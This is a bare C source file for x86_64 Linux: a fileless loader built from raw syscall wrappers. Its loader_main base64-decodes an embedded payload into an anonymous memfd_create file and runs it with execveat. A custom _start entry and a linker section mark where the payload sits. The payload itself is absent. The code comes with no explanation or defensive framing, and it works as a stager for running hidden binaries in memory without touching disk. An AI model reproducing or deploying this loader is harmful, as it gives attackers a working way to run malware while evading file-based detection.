#include <stddef.h>

/* Syscall numbers for x86_64 */
#define SYS_WRITE 1
#define SYS_MEMFD_CREATE 319
#define SYS_EXECVEAT 322
#define SYS_EXIT 60

#define MFD_CLOEXEC 0x0001U
#define AT_EMPTY_PATH 0x1000

/* Simple syscall wrappers */
static inline long syscall1(long n, long a1) {
    long ret;
    __asm__ volatile ("syscall" : "=a" (ret) : "a" (n), "D" (a1) : "rcx", "r11", "memory");
    return ret;
}

static inline long syscall2(long n, long a1, long a2) {
    long ret;
    __asm__ volatile ("syscall" : "=a" (ret) : "a" (n), "D" (a1), "S" (a2) : "rcx", "r11", "memory");
    return ret;
}

static inline long syscall3(long n, long a1, long a2, long a3) {
    long ret;
    __asm__ volatile ("syscall" : "=a" (ret) : "a" (n), "D" (a1), "S" (a2), "d" (a3) : "rcx", "r11", "memory");
    return ret;
}

static inline long syscall5(long n, long a1, long a2, long a3, long a4, long a5) {
    long ret;
    register long r10 __asm__("r10") = a4;
    register long r8 __asm__("r8") = a5;
    __asm__ volatile ("syscall" : "=a" (ret) : "a" (n), "D" (a1), "S" (a2), "d" (a3), "r" (r10), "r" (r8) : "rcx", "r11", "memory");
    return ret;
}

void loader_main(const char *payload_b64) {
    char memfd_name[] = {'f', 0};
    int fd = (int)syscall2(SYS_MEMFD_CREATE, (long)memfd_name, MFD_CLOEXEC);
    if (fd < 0) {
        syscall1(SYS_EXIT, 1);
    }

    unsigned char buf[3];
    int v[4];
    size_t i = 0;
    while (payload_b64[i]) {
        for (int k = 0; k < 4; k++) {
            v[k] = -1;
            while (payload_b64[i]) {
                char c = payload_b64[i++];
                if (c >= 'A' && c <= 'Z') { v[k] = c - 'A'; break; }
                if (c >= 'a' && c <= 'z') { v[k] = c - 'a' + 26; break; }
                if (c >= '0' && c <= '9') { v[k] = c - '0' + 52; break; }
                if (c == '+') { v[k] = 62; break; }
                if (c == '/') { v[k] = 63; break; }
                if (c == '=') { v[k] = -2; break; } // Padding
            }
            if (v[k] == -1) goto decode_done;
            if (v[k] == -2) v[k] = -1;
        }

        buf[0] = (unsigned char)((v[0] << 2) | (v[1] >> 4));
        syscall3(SYS_WRITE, fd, (long)&buf[0], 1);

        if (v[2] != -1) {
            buf[1] = (unsigned char)(((v[1] & 0xF) << 4) | (v[2] >> 2));
            syscall3(SYS_WRITE, fd, (long)&buf[1], 1);
            if (v[3] != -1) {
                buf[2] = (unsigned char)(((v[2] & 0x3) << 6) | v[3]);
                syscall3(SYS_WRITE, fd, (long)&buf[2], 1);
            }
        }
        if (v[2] == -1 || v[3] == -1) break;
    }

decode_done:
    char *argv_arr[2];
    argv_arr[0] = memfd_name;
    argv_arr[1] = NULL;
    char *envp_arr[1];
    envp_arr[0] = NULL;
    char empty_str[] = {0};
    syscall5(SYS_EXECVEAT, fd, (long)empty_str, (long)argv_arr, (long)envp_arr, AT_EMPTY_PATH);

    syscall1(SYS_EXIT, 2);
}

__attribute__((section(".text.entry")))
void _start() {
    __asm__ volatile (
        "lea payload(%rip), %rdi\n"
        "jmp loader_main\n"
    );
}

__attribute__((section(".text.last")))
void payload_loc() {
    __asm__(".global payload\npayload:");
}
